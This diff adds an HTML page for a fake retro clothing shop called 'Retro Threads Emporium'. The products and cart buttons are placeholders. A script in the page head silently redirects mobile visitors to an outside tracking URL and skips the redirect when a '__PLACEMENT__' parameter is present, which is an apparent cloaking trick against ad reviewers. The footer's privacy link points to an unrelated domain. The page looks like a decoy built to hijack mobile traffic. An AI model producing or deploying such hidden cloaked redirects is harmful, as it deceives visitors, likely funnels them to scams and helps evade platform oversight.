@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Retro Threads Emporium</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background-color: #FFD700;
+            color: #8B4513;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #FF69B4;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #FFA500;
+        }
+        nav {
+            background-color: #00CED1;
+            padding: 10px;
+        }
+        nav a {
+            color: #FFFFFF;
+            text-decoration: none;
+            margin: 0 10px;
+            font-weight: bold;
+        }
+        main {
+            padding: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+        }
+        .product {
+            background-color: #98FB98;
+            border: 3px dashed #FF4500;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 10px;
+            width: 200px;
+            text-align: center;
+        }
+        footer {
+            background-color: #FF69B4;
+            color: #FFFFFF;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Retro Threads Emporium</h1>
+    </header>
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">Shop</a>
+        <a href="#">About</a>
+        <a href="#">Contact</a>
+    </nav>
+    <main>
+        <div class="product">
+            <h2>Groovy Bell Bottoms</h2>
+            <p>Far out, man! These bell bottoms are the bee's knees!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Radical Tie-Dye Tee</h2>
+            <p>Totally tubular tie-dye that'll make you stand out!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Gnarly Neon Windbreaker</h2>
+            <p>Stay rad and protected from the elements, dude!</p>
+            <button>Add to Cart</button>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Retro Threads Emporium. All rights reserved. <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
